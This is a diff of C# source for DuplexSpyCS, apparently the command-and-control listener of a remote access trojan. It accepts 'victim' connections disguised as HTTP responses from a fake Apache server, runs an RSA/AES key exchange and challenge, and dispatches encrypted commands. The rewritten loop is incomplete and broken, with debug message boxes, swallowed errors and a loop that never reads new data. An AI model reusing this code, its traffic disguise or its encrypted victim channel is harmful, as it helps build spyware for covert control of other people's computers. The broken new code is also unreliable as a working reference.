@@ -6,6 +6,7 @@ using System.Net.Sockets;
 using System.Security;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace DuplexSpyCS
 {
@@ -58,7 +59,6 @@ namespace DuplexSpyCS
             public byte[] fnGetBytes(byte[] abBuffer) => fnGetBytes(Convert.ToBase64String(abBuffer));
             public byte[] fnGetBytes(string szMsg)
             {
-                string szBody = clsCrypto.b64E2Str(this.szBody);
                 string szResp = $"" +
                     $"HTTP/1.1 200 OK\r\n" +
                     $"Server: Apache/1.3.27\r\n" +
@@ -128,7 +128,7 @@ namespace DuplexSpyCS
         {
             if (m_qResponse.Count == 0)
             {
-                return new clsHttpResp("HTTP 500://Server internal error.");
+                return new clsHttpResp(clsCrypto.b64E2Str(clsEZData.fnGenerateRandomStr()));
             }
             else
             {
@@ -163,169 +163,93 @@ namespace DuplexSpyCS
             using (client)
             {
                 NetworkStream stream = client.GetStream();
-                clsHttpResp httpPkt = new clsHttpResp();
                 clsVictim victim = new clsVictim(this, client.Client);
-                string szVictimID = string.Empty;
 
-                string[] key_pairs = clsCrypto.CreateRSAKey(); //Create RSA key pair.
-                victim.key_pairs = (key_pairs[0], key_pairs[1]);
-                string b64_PublicKey = clsCrypto.b64E2Str(victim.key_pairs.public_key);
+                var s = clsCrypto.CreateRSAKey();
+                string szRsaPublicKey = s[0];
+                string szRsaPrivateKey = s[1];
 
-                victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(b64_PublicKey)).fnGetBytes());
+                victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());
 
-                int nRecv = 0;
+                var (header, bodyBytes) = await fnReadHttpPacket(stream);
+                if (bodyBytes.Length == 0)
+                    return;
 
-                do
+                string szBody = Encoding.UTF8.GetString(bodyBytes);
+                while (m_bIslistening)
                 {
                     try
                     {
-                        string request = await fnReadHttpRequest(stream);
-                        nRecv = request.Length;
-                        if (nRecv == 0)
-                            break;
+                        byte[] abBody = Convert.FromBase64String(szBody);
+                        if (abBody.Length == 0)
+                            continue;
 
-                        if (string.IsNullOrEmpty(request))
-                            return;
+                        clsDSP dsp = new clsDSP(abBody);
+                        var headerInfo = clsDSP.GetHeader(abBody);
+                        var msg = dsp.GetMsg();
+                        int nCmd = headerInfo.cmd;
+                        int nParam = headerInfo.para;
+                        byte[] abMsg = dsp.GetMsg().msg;
 
-                        string[] parts = request.Split(new[] { "\r\n\r\n" }, 2, StringSplitOptions.None);
-                        string header = parts[0];
-                        string body = parts.Length > 1 ? parts[1] : "";
-
-                        int contentLength = 0;
-                        foreach (string line in header.Split("\r\n"))
-                        {
-                            if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
-                            {
-                                string value = line.Substring("Content-Length:".Length).Trim();
-                                int.TryParse(value, out contentLength);
-                            }
-                        }
-
-                        if (body.Length < contentLength)
-                        {
-                            int remaining = contentLength - Encoding.UTF8.GetByteCount(body);
-                            byte[] buffer = new byte[remaining];
-                            int read = await stream.ReadAsync(buffer, 0, buffer.Length);
-                            body += Encoding.UTF8.GetString(buffer, 0, read);
-                        }
-
-                        if (!string.IsNullOrEmpty(body))
-                        {
-                            byte[] abBuffer = Convert.FromBase64String(body);
-                            clsDSP dsp = new clsDSP(abBuffer);
-
-                            var headerInfo = dsp.GetMsg();
-                            string szMsg = Encoding.UTF8.GetString(headerInfo.msg);
-
-                            if (headerInfo.cmd == 0)
-                            {
-                                if (headerInfo.para == 0)
-                                {
-
-                                }
-                            }
-                            else if (headerInfo.cmd == 1)
-                            {
-                                if (headerInfo.para == 1)
-                                {
-                                    byte[] enc_aesData = dsp.GetMsg().msg;
-
-                                    string enc_data = Encoding.UTF8.GetString(clsCrypto.RSADecrypt(enc_aesData, victim.key_pairs.private_key));
-                                    string[] s = enc_data.Split('|');
-
-                                    string key = s[0];
-                                    string iv = s[1];
-
-                                    victim._AES.key = Convert.FromBase64String(key);
-                                    victim._AES.iv = Convert.FromBase64String(iv);
-                                    string challenge = clsEZData.fnGenerateRandomStr();
-                                    victim.challenge_text = challenge;
-                                    string cipher_text = clsCrypto.AESEncrypt(challenge, victim._AES.key, victim._AES.iv);
-                                    byte[] buffer = Encoding.UTF8.GetBytes(cipher_text);
-
-                                    victim.Send(new clsHttpResp(1, 2, buffer).fnGetBytes());
-
-                                    clsStore.sql_conn.WriteKeyExchange(victim, "Sent encrypted challenge");
-                                }
-                                else if (headerInfo.para == 3)
-                                {
-                                    byte[] enc_aesData = dsp.GetMsg().msg;
-                                    string enc_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(enc_aesData)), victim._AES.key, victim._AES.iv);
-                                    string payload = Encoding.UTF8.GetString(clsCrypto.RSADecrypt(Convert.FromBase64String(enc_data), victim.key_pairs.private_key));
-                                    if (payload == victim.challenge_text)
-                                    {
-                                        victim.Send(new clsHttpResp(1, 4, clsCrypto.AESEncrypt(clsEZData.fnGenerateRandomStr(), victim._AES.key, victim._AES.iv)).fnGetBytes());
-                                        DateTime datetime = DateTime.Now;
-                                        victim.last_sent = datetime;
-                                        victim.Send(new clsHttpResp(2, 1, clsCrypto.AESEncrypt(clsEZData.fnGenerateRandomStr(), victim._AES.key, victim._AES.iv)).fnGetBytes());
-
-                                        clsStore.sql_conn.WriteKeyExchange(victim, "OK");
-                                    }
-                                }
-                            }
-                            else if (headerInfo.cmd == 2)
-                            {
-                                if (headerInfo.para == 0)
-                                {
-                                    var buffer = dsp.GetMsg();
-
-                                    string dec_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(buffer.msg)), victim._AES.key, victim._AES.iv);
-                                    string[] cmd = dec_data.Split("|");
-
-                                    try
-                                    {
-                                        fnReceivedDecoded(this, victim, cmd.ToList());
-                                    }
-                                    catch (InvalidOperationException)
-                                    {
-
-                                    }
-                                }
-                                else if (headerInfo.para == 1)
-                                {
-                                    int nDelay = 1000;
-                                    DateTime datetime = DateTime.Now;
-                                    TimeSpan span = datetime - victim.last_sent;
-                                    victim.latency_time = span.Milliseconds;
-                                    victim.last_sent = datetime;
-                                }
-
-                                var pkt = fnGetResponse();
-                                victim.Send(pkt.fnGetBytes());
-                            }
-                        }
+                        MessageBox.Show(nCmd.ToString());
                     }
                     catch (Exception ex)
                     {
-                        MessageBox.Show(ex.Message);
+
                     }
                 }
-                while (nRecv > 0);
-
-                fnDisconnected(victim);
             }
         }
 
-        private async Task<string> fnReadHttpRequest(NetworkStream stream)
+        private async Task<(string header, byte[] body)> fnReadHttpPacket(NetworkStream stream)
         {
-            byte[] buffer = new byte[8192];
-            MemoryStream ms = new MemoryStream();
+            byte[] buffer = new byte[4096];
+            MemoryStream headerStream = new MemoryStream();
 
             while (true)
             {
-                int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
-                if (bytes <= 0)
-                    return string.Empty;
+                int read = await stream.ReadAsync(buffer, 0, buffer.Length);
+                if (read <= 0)
+                    throw new Exception("Client disconnected");
 
-                ms.Write(buffer, 0, bytes);
-                string data = Encoding.UTF8.GetString(ms.ToArray());
+                headerStream.Write(buffer, 0, read);
 
-                if (data.Contains("\r\n\r\n"))
-                    return data;
+                string temp = Encoding.ASCII.GetString(headerStream.ToArray());
+                int idx = temp.IndexOf("\r\n\r\n", StringComparison.Ordinal);
+                if (idx >= 0)
+                {
+                    byte[] all = headerStream.ToArray();
+                    byte[] headerBytes = all[..(idx + 4)];
+                    byte[] remain = all[(idx + 4)..];
 
-                if (ms.Length > 1024 * 1024 * 10)
-                    throw new Exception("Request too large.");
+                    string header = Encoding.ASCII.GetString(headerBytes);
+
+                    int contentLength = 0;
+                    foreach (string line in header.Split("\r\n"))
+                    {
+                        if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
+                        {
+                            int.TryParse(line.Substring(15).Trim(), out contentLength);
+                        }
+                    }
+
+                    byte[] body = new byte[contentLength];
+                    int copied = Math.Min(remain.Length, contentLength);
+                    Array.Copy(remain, 0, body, 0, copied);
+
+                    int offset = copied;
+                    while (offset < contentLength)
+                    {
+                        int r = await stream.ReadAsync(body, offset, contentLength - offset);
+                        if (r <= 0)
+                            throw new Exception("Unexpected EOF while reading body");
+                        offset += r;
+                    }
+
+                    return (header, body);
+                }
             }
         }
+
     }
 }
